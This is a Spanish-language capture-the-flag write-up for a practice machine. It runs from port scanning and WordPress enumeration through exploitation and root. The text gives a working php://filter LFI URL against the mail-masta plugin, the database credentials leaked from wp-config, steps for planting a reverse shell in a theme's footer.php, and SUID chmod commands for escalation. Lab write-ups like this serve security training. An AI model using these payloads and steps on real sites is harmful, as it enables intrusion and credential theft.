PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

-El ftp login Anonymous está habilitado pero no hay ningún archivo

-En el puerto 80 hay una servidor default de Apache

-Hacemos enumeración web y encontramos la siguiente ruta con un wordpress:
	/wordpress

-Uilizamos lo herramienta wpscan para lista posibles usuarios y plugins vulnerables
	wpscan --url http://10.10.176.236/wordpress -e vp,u
	-Encontramos el siguiente usuario:  elyana

-Usamos el parámetro '-e ap' para ver todos los plugins instalados en el wordpress:
	wpscan --url http://10.10.176.236/wordpress -e ap
	mail-masta
	Location: http://10.10.176.236/wordpress/wp-content/plugins/mail-masta/
	Latest Version: 1.0 (up to date)

-Nota: El plugin solo aparece cuando aplicamos el parámetro '-e ap' (All plugins). Si aplicamos el parámetro '-e vp' (Vulnerable Plugins) no aparece ninguno.

-Buscamos exploit para este plugin, analizando el código vemos que podemos ir a la siguiente ruta y mediante un 'php://filter' , podemos acceder al archivo wp-config en formato base64:
	view-source:http://10.10.176.236/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php

-Decodificamos el archivo y obtenemos credenciales para el usuario 'elyana':
	echo 'código en base64(Es muy largo)' | base64 -d

-Contenido del wp-config:
	-DB_USER: elyana
	-DB_PASSWORD: H@ckme@123

-Nos vamos a la ruta /wp-login y nos logueamos como el usuario elyana

-Dentro del dashboard de wordpress somos admin, por lo que podemos editar los templates sin problema

-Editamos el template footer.php con la reverse shell de PestestMonkey:
	Appearance --> Theme Editor --> Footer.php
	Refrescamos la página principal con 'nc' a la escucha y obtenemos la reverse shell como el usuario www-data

## Escalada de Privilegios

-Tenemos permisos SUID sobre el siguiente binario:
	/bin/chmod

-Damos permisos SUID a la /bin/bash y elevamos la shell con bash -p:
	chmod +s /bin/bash
	bash -p
	bash-4.4#

-Las Flags están en Base64, hay que decodificarlas:
	echo 'Flags.txt'  |  base64 -d
